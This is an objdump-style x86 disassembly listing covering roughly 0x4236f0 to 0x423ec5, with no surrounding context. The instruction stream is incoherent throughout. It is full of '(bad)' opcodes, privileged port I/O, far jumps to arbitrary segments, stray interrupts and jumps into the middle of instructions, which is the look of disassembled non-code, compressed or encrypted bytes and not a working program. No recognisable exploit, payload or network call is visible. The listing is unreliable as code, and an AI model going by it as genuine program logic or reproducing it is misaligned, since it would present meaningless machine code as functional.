  4236f0:	(bad)  
  4236f1:	pusha  
  4236f2:	sub    eax,0x3e6f8a08
  4236f7:	jb     0x4236c7
  4236f9:	loope  0x423729
  4236fb:	adc    cl,ch
  4236fd:	xor    bh,cl
  4236ff:	lds    esi,FWORD PTR [eax+0x337ebe33]
  423705:	and    ebx,edi
  423707:	in     eax,0x4f
  423709:	pop    eax
  42370a:	jmp    0xb05f:0xca137142
  423711:	scas   eax,DWORD PTR es:[edi]
  423712:	popa   
  423713:	dec    esi
  423714:	bound  ebx,QWORD PTR [esi+0x52121bf6]
  42371a:	leave  
  42371b:	es dec edi
  42371d:	pop    es
  42371e:	push   0x5bf83b61
  423723:	nop
  423724:	ins    DWORD PTR es:[edi],dx
  423725:	arpl   WORD PTR [edi],bp
  423727:	jle    0x4237a2
  423729:	or     BYTE PTR [ebx+ebx*4],bl
  42372c:	sbb    eax,0x991a9cf1
  423731:	enter  0xe0eb,0x2
  423735:	adc    ch,BYTE PTR [eax+0x2b5e46e5]
  42373b:	addr16 pop esi
  42373d:	push   0x47
  42373f:	stos   DWORD PTR es:[edi],eax
  423740:	mov    ds:0xaabcc737,eax
  423745:	inc    eax
  423746:	or     dh,BYTE PTR [esi+ebx*4+0x1a]
  42374a:	outs   dx,BYTE PTR ds:[esi]
  42374b:	rol    esp,cl
  42374d:	rol    BYTE PTR [edi+0x526cd984],1
  423753:	mov    al,ds:0x96855294
  423758:	or     BYTE PTR [ecx-0x67],ch
  42375b:	jmp    0xc566:0x56870a8e
  423762:	mov    dh,0x2b
  423764:	cs iret 
  423766:	fs aad 0xd1
  423769:	mov    dh,0x3a
  42376b:	imul   edx,DWORD PTR [esi],0xffffff93
  42376e:	test   BYTE PTR [ecx+0x34719638],ch
  423774:	inc    ecx
  423775:	xchg   edi,eax
  423776:	(bad)  [edi+eiz*4]
  423779:	xor    ecx,ebp
  42377b:	in     al,0x5a
  42377d:	mov    esi,0xf7548d2c
  423782:	pop    ecx
  423783:	sbb    eax,0xfb4c59d6
  423788:	dec    edx
  423789:	in     eax,dx
  42378a:	mov    cl,0x87
  42378c:	or     ch,BYTE PTR [esi-0x542f0d0d]
  423792:	stos   DWORD PTR es:[edi],eax
  423793:	mov    ah,0xd2
  423795:	aad    0x43
  423797:	and    BYTE PTR [edi+0x3b],dl
  42379a:	dec    edi
  42379b:	xchg   al,bl
  42379d:	iret   
  42379e:	or     DWORD PTR [ebp+0x44],edi
  4237a1:	jae    0x423804
  4237a3:	push   ds
  4237a4:	dec    ebx
  4237a5:	aaa    
  4237a6:	or     BYTE PTR [edi-0x1b389c7b],cl
  4237ac:	repz mov ebx,0x2c35c26f
  4237b2:	das    
  4237b3:	out    0x89,eax
  4237b5:	jno    0x423751
  4237b7:	sub    DWORD PTR [eax],0xffffffff
  4237ba:	inc    edi
  4237bb:	hlt    
  4237bc:	push   ds
  4237bd:	cdq    
  4237be:	dec    ebp
  4237bf:	test   dl,cl
  4237c1:	sub    ebp,esi
  4237c3:	ret    0xb7d0
  4237c6:	sub    ecx,DWORD PTR [eax-0x1754da77]
  4237cc:	ins    DWORD PTR es:[edi],dx
  4237cd:	mov    al,0x19
  4237cf:	loopne 0x423793
  4237d1:	mov    esp,0x4927fbdf
  4237d6:	nop
  4237d7:	or     dl,BYTE PTR [ecx]
  4237d9:	sbb    al,0x6b
  4237db:	mov    DWORD PTR [esi-0x3e],eax
  4237de:	push   eax
  4237df:	dec    edx
  4237e0:	inc    esp
  4237e1:	(bad)  
  4237e2:	shl    ecx,1
  4237e4:	dec    esi
  4237e5:	mov    DWORD PTR [esi-0x36],0xba10449f
  4237ec:	mov    ?,ebp
  4237ee:	push   ebp
  4237ef:	leave  
  4237f0:	xchg   esi,eax
  4237f1:	sub    esp,DWORD PTR [esi+0xd87bea5]
  4237f7:	adc    BYTE PTR [edi+0x41],bh
  4237fa:	fdivr  QWORD PTR [ebx]
  4237fc:	mov    dh,BYTE PTR [ebx]
  4237fe:	pop    ss
  4237ff:	int    0x17
  423801:	and    ch,BYTE PTR [esi+0x8f9d4ac]
  423807:	inc    ecx
  423808:	dec    esi
  423809:	jno    0x423859
  42380b:	mov    esp,0x7a40baec
  423810:	loopne 0x423860
  423812:	icebp  
  423813:	jnp    0x42379a
  423815:	pushf  
  423816:	rol    BYTE PTR [ecx],0xfe
  423819:	ret    0x983b
  42381c:	ret    0x4cc
  42381f:	js     0x4237ce
  423821:	outs   dx,DWORD PTR ds:[esi]
  423822:	mov    DWORD PTR [ebp+0x4f5f0a9d],ebp
  423828:	int    0xe8
  42382a:	and    eax,0x1
  42382d:	js     0x4237f4
  42382f:	and    BYTE PTR [ebp+edx*2-0x51],cl
  423833:	jne    0x423850
  423835:	jb     0x42381f
  423837:	jecxz  0x4237f6
  423839:	dec    eax
  42383a:	xor    cl,al
  42383c:	mov    dh,0xe3
  42383e:	push   0xc4d3d665
  423843:	lock adc al,0x33
  423846:	aas    
  423847:	retf   
  423848:	inc    ecx
  423849:	dec    eax
  42384a:	mov    ss,WORD PTR [eax-0x7a]
  42384d:	mov    WORD PTR [eax+0x6c58bbf8],cs
  423853:	jbe    0x4237da
  423855:	add    al,0x17
  423857:	repnz cmp BYTE PTR [edi+ebp*8+0x4a9bd02a],0x87
  423860:	xchg   BYTE PTR [eax+0x1b4dba82],ch
  423866:	icebp  
  423867:	out    dx,eax
  423868:	rol    BYTE PTR [esi],cl
  42386a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42386b:	ds (bad) 
  42386d:	(bad)  
  42386e:	(bad)  
  42386f:	adc    esi,edx
  423871:	enter  0x7e24,0x4a
  423875:	sbb    ecx,esi
  423877:	mov    edx,0x6d3c9d68
  42387c:	icebp  
  42387d:	mov    ebx,0x64c2bcb
  423882:	ja     0x423824
  423884:	not    DWORD PTR [eax]
  423886:	scas   al,BYTE PTR es:[edi]
  423887:	call   0xef1242e9
  42388c:	cdq    
  42388d:	test   DWORD PTR [ebp+0x69],0x7715e51
  423894:	loopne 0x42382a
  423896:	inc    edx
  423897:	inc    edx
  423898:	mov    esi,0x11566865
  42389d:	and    DWORD PTR [edi+0x70d64219],ebx
  4238a3:	push   edi
  4238a4:	xor    DWORD PTR [esi],0x9b7ec27e
  4238aa:	(bad)  
  4238ab:	aas    
  4238ac:	outs   dx,BYTE PTR ds:[esi]
  4238ad:	adc    DWORD PTR [edi-0x3affdc98],0xffffff88
  4238b4:	cmp    al,0xb1
  4238b6:	stos   BYTE PTR es:[edi],al
  4238b7:	aad    0xe7
  4238b9:	cli    
  4238ba:	jp     0x42391c
  4238bc:	and    al,0xb1
  4238be:	jle    0x423892
  4238c0:	fs ins DWORD PTR es:[edi],dx
  4238c2:	hlt    
  4238c3:	shl    DWORD PTR [ecx-0x7cb50fc2],1
  4238c9:	mov    bl,0xe8
  4238cb:	mov    DWORD PTR [ebx],ecx
  4238cd:	test   DWORD PTR [ebx-0x4c3cdaa6],esp
  4238d3:	pusha  
  4238d4:	clc    
  4238d5:	stos   BYTE PTR es:[edi],al
  4238d6:	xchg   esi,eax
  4238d7:	pushf  
  4238d8:	or     dl,ch
  4238da:	out    dx,al
  4238db:	out    dx,al
  4238dc:	(bad)  
  4238dd:	sub    eax,0xaffa3165
  4238e2:	push   ss
  4238e3:	cmp    al,0x70
  4238e5:	daa    
  4238e6:	fwait
  4238e7:	add    ebx,ebp
  4238e9:	and    cl,ch
  4238eb:	jmp    0x4238f0
  4238ed:	call   0x2244:0x9849a0ff
  4238f4:	outs   dx,DWORD PTR ds:[esi]
  4238f5:	scas   al,BYTE PTR es:[edi]
  4238f6:	ja     0x42390f
  4238f8:	adc    bh,BYTE PTR [edi+0x767ffc9a]
  4238fe:	test   DWORD PTR [esi+0x5ddbda1a],ebp
  423904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423905:	xchg   edx,eax
  423906:	xchg   ebp,eax
  423907:	cmp    BYTE PTR [ebx+ebx*8-0x535c820b],cl
  42390e:	push   cs
  42390f:	aaa    
  423910:	in     al,dx
  423911:	ret    
  423912:	jnp    0x423917
  423914:	sbb    ecx,edi
  423916:	or     al,BYTE PTR [ebp+0x48761ff]
  42391c:	ins    DWORD PTR es:[edi],dx
  42391d:	adc    ch,ah
  42391f:	lahf   
  423920:	xor    bh,dl
  423922:	mov    BYTE PTR [eax+0x7c6aff70],dh
  423928:	xor    DWORD PTR [ecx+ecx*1-0x7b],0x480e3d41
  423930:	fcmovnu st,st(7)
  423932:	mov    ch,0x41
  423934:	outs   dx,DWORD PTR ds:[esi]
  423935:	push   0x13
  423937:	jbe    0x4238e2
  423939:	in     al,0xa4
  42393b:	sbb    ch,bl
  42393d:	lods   eax,DWORD PTR ds:[esi]
  42393e:	jp     0x423905
  423940:	mov    dh,0xc2
  423942:	int3   
  423943:	and    DWORD PTR [edx+0x70],edx
  423946:	or     edi,esi
  423948:	push   ss
  423949:	add    al,0xed
  42394b:	mov    cl,0xae
  42394d:	jno    0x423934
  42394f:	inc    edi
  423950:	mov    ds:0x2e6a629c,al
  423955:	mov    ebp,0xec977fa2
  42395a:	pminub mm5,QWORD PTR [esi-0x6ae5ae79]
  423961:	add    ecx,DWORD PTR [eax+0x30]
  423964:	sbb    bh,bh
  423966:	(bad)  
  423967:	loopne 0x4239ae
  423969:	lds    esi,FWORD PTR [edi+0x7a8768d6]
  42396f:	add    al,BYTE PTR [esi+0x7d80179a]
  423975:	xor    al,0xf6
  423977:	sti    
  423978:	fsubp  st(5),st
  42397a:	rcl    BYTE PTR [edi+0x57],1
  42397d:	sub    al,0x93
  42397f:	in     al,dx
  423980:	and    eax,0x2625ce82
  423985:	std    
  423986:	out    dx,eax
  423987:	mov    edi,0x5317f258
  42398c:	dec    esi
  42398d:	sub    DWORD PTR [esp+edx*2-0xd],0xffffff8c
  423992:	(bad)  
  423993:	in     eax,dx
  423994:	adc    ebx,eax
  423996:	jg     0x4239bd
  423998:	cmp    eax,0xcad29e86
  42399d:	in     eax,dx
  42399e:	retf   0x2046
  4239a1:	sub    eax,0x14cd2202
  4239a6:	xchg   ebp,eax
  4239a7:	out    dx,al
  4239a8:	sbb    DWORD PTR [eax+0x4],ecx
  4239ab:	pop    edi
  4239ac:	xor    DWORD PTR [edx],0x3a
  4239af:	and    BYTE PTR [ebp-0x26],al
  4239b2:	jg     0x4239dc
  4239b4:	sbb    bh,BYTE PTR [ecx+0x7322952c]
  4239ba:	mov    gs,WORD PTR [eax-0xf]
  4239bd:	out    0x54,eax
  4239bf:	sub    DWORD PTR [eax],ecx
  4239c1:	add    al,0x74
  4239c3:	repnz bound esi,QWORD PTR [edx+0x13f35d80]
  4239ca:	sub    eax,0x2e2435d0
  4239cf:	les    ebp,FWORD PTR [edx+0x3198edf3]
  4239d5:	inc    edi
  4239d6:	push   edi
  4239d7:	lods   eax,DWORD PTR ds:[esi]
  4239d8:	sti    
  4239d9:	push   esp
  4239da:	adc    eax,0xc13a8300
  4239df:	jns    0x4239e4
  4239e1:	ret    0x54bb
  4239e4:	xor    BYTE PTR [ecx],cl
  4239e6:	gs and eax,0x76ec4c71
  4239ec:	(bad)  
  4239ee:	in     al,0xb1
  4239f0:	shr    al,cl
  4239f2:	pop    ebx
  4239f3:	mov    edx,0x6287e10c
  4239f8:	and    esp,DWORD PTR fs:[edx+0x74dfae8f]
  4239ff:	xor    dh,BYTE PTR [esi+0xde39213]
  423a05:	jg     0x423a81
  423a07:	push   0xffffffc2
  423a09:	pop    es
  423a0a:	and    edx,DWORD PTR fs:[ebp-0x3a79760e]
  423a11:	adc    eax,0x57867d08
  423a16:	fdivrp st(4),st
  423a18:	iret   
  423a19:	mov    eax,ds:0x5f28468d
  423a1e:	sub    ah,BYTE PTR [edi]
  423a20:	mov    edi,0x6e2cfe65
  423a25:	or     ah,BYTE PTR [eax-0x71]
  423a28:	stos   DWORD PTR es:[edi],eax
  423a29:	retf   
  423a2a:	cwde   
  423a2b:	dec    ebp
  423a2c:	push   edx
  423a2d:	mov    bl,0x68
  423a2f:	mov    cl,0x1c
  423a31:	jo     0x4239b8
  423a33:	sub    DWORD PTR [ebp+esi*4+0x1f],esi
  423a37:	cs call 0xbbb84341
  423a3d:	cmp    al,0xd4
  423a3f:	pushf  
  423a40:	sti    
  423a41:	cmp    al,0x69
  423a43:	xor    edi,eax
  423a45:	cld    
  423a46:	test   al,0x6c
  423a48:	out    0x65,eax
  423a4a:	mov    BYTE PTR [edx+esi*8-0xa0255d5],bl
  423a51:	sbb    DWORD PTR [ebp-0x72],0xfe416a8b
  423a58:	pop    ebx
  423a59:	dec    ecx
  423a5a:	lods   eax,DWORD PTR ds:[esi]
  423a5b:	hlt    
  423a5c:	sbb    al,0x68
  423a5e:	sbb    DWORD PTR [edi+0x40],esi
  423a61:	clc    
  423a62:	gs inc edx
  423a64:	sti    
  423a65:	fstp   st(1)
  423a67:	ins    DWORD PTR es:[edi],dx
  423a68:	aam    0xbe
  423a6a:	(bad)  
  423a6b:	sbb    esp,DWORD PTR [ebx+0x1a360c7]
  423a71:	jae    0x423aa5
  423a73:	or     DWORD PTR [ebx-0x2a53da56],eax
  423a79:	sti    
  423a7a:	sub    BYTE PTR [ebp-0x11],dl
  423a7d:	out    0x69,al
  423a7f:	rcr    BYTE PTR [edx+0x11],1
  423a82:	adc    al,0x80
  423a84:	imul   eax,DWORD PTR [esi+ebx*8-0x4a84ed74],0x28
  423a8c:	mov    dh,0x40
  423a8e:	(bad)  
  423a8f:	loop   0x423a44
  423a91:	aad    0x40
  423a93:	ins    DWORD PTR es:[edi],dx
  423a94:	(bad)  
  423a95:	cmp    edi,edi
  423a97:	(bad)  [esi-0x43]
  423a9a:	mov    esi,0x53a14238
  423a9f:	cmp    al,BYTE PTR [ebp+0x4a24e43c]
  423aa5:	jl     0x423aa0
  423aa7:	shr    al,1
  423aa9:	stos   BYTE PTR es:[edi],al
  423aaa:	pushf  
  423aab:	ret    0xe4d5
  423aae:	addr16 cmp bl,dl
  423ab1:	mov    bl,0x94
  423ab3:	cwde   
  423ab4:	lahf   
  423ab5:	push   0xbc3ad40d
  423aba:	jge    0x423abe
  423abc:	lods   eax,DWORD PTR ds:[esi]
  423abd:	scas   al,BYTE PTR es:[edi]
  423abe:	cmp    DWORD PTR [ebp+0x58],edx
  423ac1:	rol    DWORD PTR [edx+edi*4-0x42],1
  423ac5:	push   es
  423ac6:	dec    esi
  423ac7:	dec    ebx
  423ac8:	pop    ebx
  423aca:	xchg   ebp,eax
  423acb:	in     eax,0xd
  423acd:	mov    edi,0x4fa262df
  423ad2:	les    edx,FWORD PTR [esp+eax*8-0x7f]
  423ad6:	ret    
  423ad7:	shl    ebx,0x4f
  423ada:	jae    0x423b51
  423adc:	js     0x423a7c
  423ade:	xor    DWORD PTR [edi],ecx
  423ae0:	neg    DWORD PTR [ebx]
  423ae2:	push   esi
  423ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ae4:	nop    DWORD PTR ds:0xb32d26db
  423aeb:	out    dx,eax
  423aec:	inc    ebx
  423aed:	pushf  
  423aee:	mov    bl,0xc
  423af0:	inc    ebx
  423af1:	(bad)  
  423af2:	(bad)  
  423af3:	dec    eax
  423af4:	add    al,0x7f
  423af7:	mov    cl,0x8a
  423af9:	bound  edi,QWORD PTR [ebp-0x20]
  423afc:	pop    edx
  423afd:	xor    edi,edx
  423aff:	sbb    ebp,DWORD PTR ds:0x264f6f9b
  423b05:	repnz retf 
  423b07:	out    dx,eax
  423b08:	adc    BYTE PTR [eax-0x207debef],ch
  423b0e:	add    esi,DWORD PTR [eax+ecx*8+0x1b]
  423b12:	popf   
  423b13:	stc    
  423b14:	lods   al,BYTE PTR ds:[esi]
  423b15:	pop    esp
  423b16:	inc    esi
  423b17:	imul   esp,DWORD PTR [edi-0x4ef0c736],0x8
  423b1e:	daa    
  423b1f:	cmp    DWORD PTR [eax-0x2e],0xffffffb7
  423b23:	loopne 0x423b1e
  423b25:	icebp  
  423b26:	or     ebx,edx
  423b28:	sbb    BYTE PTR [ebp-0x18a07727],dh
  423b2e:	ds jmp 0xad741939
  423b34:	push   eax
  423b35:	push   cs
  423b36:	(bad)  
  423b38:	push   ds
  423b39:	inc    ebx
  423b3a:	adc    eax,0x5c38f37d
  423b3f:	xchg   ebx,eax
  423b40:	pop    ds
  423b41:	or     al,0xbb
  423b43:	test   al,0x2e
  423b45:	arpl   WORD PTR [esi],bp
  423b47:	sbb    al,BYTE PTR [ebp-0x24]
  423b4a:	cmc    
  423b4b:	mov    cl,0xa7
  423b4d:	adc    eax,0xc9e76116
  423b52:	pop    ebx
  423b53:	pop    edx
  423b54:	std    
  423b55:	icebp  
  423b56:	and    BYTE PTR [edx+0x7c],bh
  423b59:	shr    DWORD PTR [ebp-0x7e3d1d92],0xd4
  423b60:	out    dx,al
  423b61:	add    cl,BYTE PTR [esi-0x4c8be59]
  423b67:	imul   eax,DWORD PTR [eax+eiz*2],0xffffffdf
  423b6b:	stos   BYTE PTR es:[edi],al
  423b6c:	aas    
  423b6d:	icebp  
  423b6e:	in     al,0xa7
  423b70:	push   edx
  423b71:	sub    eax,0x7bfb1a96
  423b76:	pop    ds
  423b77:	cmp    al,0x3e
  423b79:	je     0x423b2d
  423b7b:	ins    BYTE PTR es:[edi],dx
  423b7c:	scas   al,BYTE PTR es:[edi]
  423b7d:	push   esi
  423b7e:	retf   
  423b7f:	pop    esi
  423b80:	(bad)  
  423b81:	xchg   edi,eax
  423b82:	push   ss
  423b83:	inc    ecx
  423b84:	jecxz  0x423bab
  423b86:	mov    edx,0x417ab0da
  423b8b:	int3   
  423b8c:	mov    edi,DWORD PTR [ecx+0x7b]
  423b8f:	mov    esi,0x3943dd7d
  423b94:	clc    
  423b95:	(bad)  
  423b96:	push   ds
  423b97:	inc    ebx
  423b98:	call   0x240ec696
  423b9d:	stos   BYTE PTR es:[edi],al
  423b9e:	adc    DWORD PTR [eax+ebx*4+0x5f],esi
  423ba2:	mov    dl,0x33
  423ba4:	xor    dl,bl
  423ba6:	cli    
  423ba7:	pop    edx
  423ba8:	lahf   
  423ba9:	inc    ebp
  423baa:	mov    eax,ds:0x9ee54a93
  423baf:	ret    
  423bb0:	into   
  423bb1:	push   edx
  423bb2:	pop    ax
  423bb4:	xchg   edi,eax
  423bb5:	ja     0x423b6c
  423bb7:	mov    bh,0x32
  423bb9:	daa    
  423bba:	mov    esp,0xddfad2e3
  423bbf:	mov    bl,0x6e
  423bc1:	mov    ah,BYTE PTR [edi+0x7]
  423bc4:	pop    ds
  423bc5:	mov    ebp,0xf383fcbf
  423bca:	inc    DWORD PTR [edx-0x43]
  423bcd:	fistp  DWORD PTR ss:[esi-0x76]
  423bd1:	jp     0x423b79
  423bd3:	push   cs
  423bd4:	lods   eax,DWORD PTR ds:[esi]
  423bd5:	push   esp
  423bd6:	addr16 push esi
  423bd8:	loopne 0x423c21
  423bda:	pushf  
  423bdb:	test   DWORD PTR [ebx+0x447d53f2],eax
  423be1:	mov    eax,cs
  423be3:	fs gs into 
  423be6:	jmp    0xc049:0xebbc1859
  423bed:	fild   WORD PTR [edi+eax*8]
  423bf0:	ds out dx,al
  423bf2:	repnz clc 
  423bf4:	mov    al,BYTE PTR [edi+0x54]
  423bf7:	mov    ebp,0x8eca45d5
  423bfc:	pop    ss
  423bfd:	out    0x66,eax
  423bff:	add    esp,DWORD PTR [eax-0xb]
  423c02:	sti    
  423c03:	mov    dl,0xfe
  423c05:	mov    eax,ds:0x4fb930cd
  423c0a:	jp     0x423c2c
  423c0c:	sub    al,0xf1
  423c0e:	pop    ecx
  423c0f:	sub    edx,DWORD PTR [esi+0x78]
  423c12:	test   eax,0xabfc373f
  423c17:	cmp    al,0xb8
  423c19:	push   es
  423c1a:	sbb    al,0xc6
  423c1c:	in     eax,0xa8
  423c1e:	out    0x95,al
  423c20:	sahf   
  423c21:	adc    ch,BYTE PTR gs:[edx-0x1e]
  423c25:	add    cl,BYTE PTR [edi+ebx*2-0x198085c9]
  423c2c:	pop    ss
  423c2d:	pop    eax
  423c2e:	adc    esi,DWORD PTR [edx]
  423c30:	call   0xfa282ff2
  423c35:	xor    eax,0x9583101b
  423c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c3b:	retf   
  423c3c:	xor    dh,cl
  423c3e:	popa   
  423c3f:	dec    edi
  423c40:	scas   al,BYTE PTR es:[edi]
  423c41:	dec    edx
  423c42:	(bad)  
  423c43:	icebp  
  423c44:	jmp    0xda1e235f
  423c49:	mov    edi,0xabbef3e6
  423c4e:	inc    ecx
  423c4f:	in     al,dx
  423c50:	xor    ecx,edi
  423c52:	pop    eax
  423c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c54:	mov    BYTE PTR ds:0x3b4f3b97,bl
  423c5a:	aas    
  423c5b:	cmp    BYTE PTR [ebp-0x40],0xe4
  423c5f:	mov    ebp,0x86c5e42d
  423c64:	sub    al,0x83
  423c66:	(bad)  
  423c67:	pop    ecx
  423c68:	adc    dl,BYTE PTR [ecx+0x74]
  423c6b:	adc    DWORD PTR [ecx+0x11],esp
  423c6e:	jne    0x423c75
  423c70:	fist   DWORD PTR [edi]
  423c72:	or     esp,DWORD PTR [edx]
  423c74:	mov    bh,0x41
  423c76:	or     ah,BYTE PTR [ecx]
  423c78:	dec    ebx
  423c79:	in     eax,dx
  423c7a:	popa   
  423c7b:	int3   
  423c7c:	inc    esp
  423c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c7e:	out    dx,eax
  423c7f:	jo     0x423c0a
  423c81:	cmc    
  423c82:	dec    edi
  423c83:	pop    ss
  423c84:	or     al,0x86
  423c86:	out    dx,al
  423c87:	popa   
  423c88:	cmp    eax,0x31d0315f
  423c8d:	mov    bl,0x76
  423c8f:	mov    edi,0x9e4559e8
  423c94:	aam    0xd1
  423c96:	adc    ebp,ebp
  423c98:	pop    ebp
  423c99:	cmp    esi,DWORD PTR [eax+0x31b6d4c5]
  423c9f:	mov    eax,0xc369c3b3
  423ca4:	fisttp DWORD PTR [ebx]
  423ca6:	xchg   edx,eax
  423ca7:	lea    ebp,[edi-0x32c8cf61]
  423cad:	cli    
  423cae:	mov    edi,0x8e596c95
  423cb3:	adc    DWORD PTR [edi-0x353617c0],0x39
  423cba:	push   ss
  423cbb:	mov    BYTE PTR [ebp-0x6b],bl
  423cbe:	in     eax,0xa0
  423cc0:	scas   eax,DWORD PTR es:[edi]
  423cc1:	mov    BYTE PTR [ecx-0x3ae60c9b],cl
  423cc7:	test   BYTE PTR [esi+0x7e2aa857],ah
  423ccd:	sbb    ch,BYTE PTR [edx-0x44bf8ea2]
  423cd3:	jno    0x423c99
  423cd5:	js     0x423cbc
  423cd7:	jmp    0x3aa412ed
  423cdc:	addr16 inc edx
  423cde:	and    DWORD PTR [edx+esi*2-0x35],esp
  423ce2:	outs   dx,BYTE PTR ds:[esi]
  423ce3:	cs cmp ebx,edx
  423ce6:	pop    esi
  423ce7:	cmp    DWORD PTR [edx+0x20],edi
  423cea:	push   edi
  423ceb:	lahf   
  423cec:	dec    ecx
  423ced:	sub    bl,BYTE PTR [ebp-0x1809833e]
  423cf3:	ret    0xcbaa
  423cf6:	push   ecx
  423cf7:	(bad)  
  423cf8:	arpl   WORD PTR [edi+ebp*4-0x59],sp
  423cfc:	enter  0x51d6,0xb1
  423d00:	sub    esi,DWORD PTR [ebp+esi*4-0x26]
  423d04:	adc    eax,0x90cf9253
  423d09:	lea    edi,[ebx]
  423d0b:	cmp    BYTE PTR [ecx+ecx*8+0x4e],bl
  423d0f:	jno    0x423cb5
  423d11:	test   al,0xcb
  423d13:	cmp    eax,0xa0c36663
  423d18:	out    dx,eax
  423d19:	jbe    0x423d88
  423d1b:	ret    
  423d1c:	dec    edi
  423d1d:	(bad)  
  423d1e:	imul   edx,DWORD PTR [ebx],0x52c1144
  423d24:	adc    eax,0x86e33028
  423d29:	push   0x60
  423d2b:	les    esp,FWORD PTR [edx+ebx*4]
  423d2e:	in     al,0xa0
  423d30:	mov    eax,ds:0x8b0ae146
  423d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d36:	xor    esi,DWORD PTR [edx+0x5f28dad0]
  423d3c:	mov    ch,BYTE PTR [eax-0x75]
  423d3f:	mov    cl,0x89
  423d41:	mul    DWORD PTR [ebx]
  423d43:	fcom   DWORD PTR [esi]
  423d45:	or     BYTE PTR [ebx+edx*1-0x25],ah
  423d49:	jmp    0x6e274fc8
  423d4e:	add    al,0x4e
  423d50:	retf   0x396f
  423d53:	in     eax,0x59
  423d55:	or     DWORD PTR [ecx+eax*4-0x73],0xffffffd7
  423d5a:	pop    eax
  423d5b:	jecxz  0x423cde
  423d5d:	pusha  
  423d5e:	and    al,0xa2
  423d60:	cmp    BYTE PTR [eax],dh
  423d62:	(bad)  
  423d63:	xor    DWORD PTR [ebp+eiz*4+0x275e0a6b],ecx
  423d6a:	xchg   esp,eax
  423d6b:	adc    al,0x7
  423d6d:	xchg   DWORD PTR [esp+eax*8+0x1a],esi
  423d71:	stos   DWORD PTR es:[edi],eax
  423d72:	call   0x76f6:0xed7c1b26
  423d79:	jmp    FWORD PTR [eax]
  423d7b:	xchg   edi,eax
  423d7c:	daa    
  423d7d:	mov    eax,ds:0xb0b6407a
  423d82:	loope  0x423d06
  423d84:	add    DWORD PTR [eax+0x1dd0fdd5],edi
  423d8a:	jecxz  0x423dee
  423d8c:	xlat   BYTE PTR ds:[ebx]
  423d8d:	cdq    
  423d8e:	or     ch,BYTE PTR [edx+0x1eb33248]
  423d94:	mov    bl,0x62
  423d96:	dec    ebx
  423d97:	mov    eax,0x675d75d9
  423d9c:	pslld  mm3,QWORD PTR [eax]
  423d9f:	sbb    eax,0x4acdeaa
  423da4:	mov    ecx,esi
  423da6:	cmp    al,0xbf
  423da8:	in     al,dx
  423da9:	jo     0x423e23
  423dab:	call   0x3b53:0x9632de86
  423db2:	stos   BYTE PTR es:[edi],al
  423db3:	jns    0x423d7f
  423db5:	xchg   edi,eax
  423db6:	mov    dl,0x9a
  423db8:	repnz repnz daa 
  423dbb:	and    BYTE PTR [edi*8-0x5ccb9c34],al
  423dc2:	(bad)  
  423dc3:	outs   dx,DWORD PTR ds:[esi]
  423dc4:	stc    
  423dc5:	jno    0x423d4d
  423dc7:	xchg   esp,eax
  423dc8:	pushf  
  423dc9:	sub    ecx,DWORD PTR [ebx]
  423dcb:	(bad)  [edi+ebx*4-0x7e1b3642]
  423dd2:	sub    ebp,DWORD PTR [esi]
  423dd4:	mov    eax,ds:0x5ca67f84
  423dd9:	lds    edi,FWORD PTR [ecx-0x1982c048]
  423ddf:	call   0x2d8f17b2
  423de4:	into   
  423de5:	xchg   ecx,eax
  423de6:	out    0x92,al
  423de8:	retf   0x80c3
  423deb:	scas   eax,DWORD PTR es:[edi]
  423dec:	(bad)  
  423ded:	pop    esi
  423dee:	mov    edi,0x29b4f417
  423df3:	sub    al,0x8e
  423df5:	(bad)  [ebx-0x5b]
  423df8:	clc    
  423df9:	aas    
  423dfa:	xor    eax,0x6040ba29
  423dff:	data16 jl 0x423dc2
  423e02:	or     DWORD PTR ds:0xa903c897,edx
  423e08:	test   al,0xcf
  423e0a:	sbb    al,0x33
  423e0c:	xchg   dh,cl
  423e0e:	mov    bl,0x8f
  423e10:	je     0x423dd5
  423e12:	jmp    0xb59:0xcde6f752
  423e19:	(bad)
  423e1c:	std    
  423e1d:	push   edx
  423e1e:	mov    dh,0x19
  423e20:	dec    ebx
  423e21:	xor    eax,0x91950ecf
  423e26:	xor    bh,al
  423e28:	dec    ebp
  423e29:	sub    ch,BYTE PTR [ebp+edx*4+0x64]
  423e2d:	mov    esp,0x471035
  423e32:	icebp  
  423e33:	int    0x51
  423e35:	xchg   esp,eax
  423e36:	jl     0x423e65
  423e38:	mov    ds:0x49c124c3,eax
  423e3d:	mov    ah,0x68
  423e3f:	jmp    0xe254:0xcc3b4e5f
  423e46:	dec    edx
  423e47:	cmp    ebp,esi
  423e49:	(bad)
  423e4c:	xlat   BYTE PTR ds:[ebx]
  423e4d:	or     BYTE PTR [ecx+0x2c],0x33
  423e51:	dec    ebp
  423e52:	adc    eax,esi
  423e54:	pop    ecx
  423e55:	enter  0xee5a,0xc0
  423e59:	(bad)  
  423e5b:	xchg   ecx,eax
  423e5c:	push   0xffffff9e
  423e5e:	pop    edi
  423e5f:	in     eax,0xac
  423e61:	jmp    0x423e9a
  423e63:	jmp    0xd313:0x826e8bc
  423e6a:	push   0x54bb77d1
  423e6f:	mov    ecx,0xcfb65a8c
  423e74:	xchg   ebx,ecx
  423e76:	icebp  
  423e77:	adc    al,0x5c
  423e79:	sub    ah,BYTE PTR [edx]
  423e7b:	(bad)  
  423e7d:	test   eax,0xd6c226f
  423e82:	xor    ah,dl
  423e84:	fs ret 0xd1ff
  423e88:	cdq    
  423e89:	cmp    BYTE PTR [esi-0x1cce8e8],al
  423e8f:	fist   DWORD PTR [ebp+0x2142ac6b]
  423e95:	addr16 (bad) 
  423e97:	lahf   
  423e98:	arpl   WORD PTR ds:0x6de152b3,sp
  423e9e:	or     esi,DWORD PTR [bp-0x28a5]
  423ea3:	push   es
  423ea4:	mov    bh,0xe4
  423ea6:	mov    esp,0xae940654
  423eab:	sbb    al,0xab
  423ead:	add    BYTE PTR [edi+ebx*8],0x13
  423eb1:	mov    bh,0x12
  423eb3:	cld    
  423eb4:	cmp    al,0x43
  423eb6:	scas   eax,DWORD PTR es:[edi]
  423eb7:	fidiv  DWORD PTR [edi+0x1901626b]
  423ebd:	mov    al,ds:0xb47bcd80
  423ec2:	cs xor edx,ecx
  423ec5:	rcl    DWORD PTR [edx+0x2],0x16
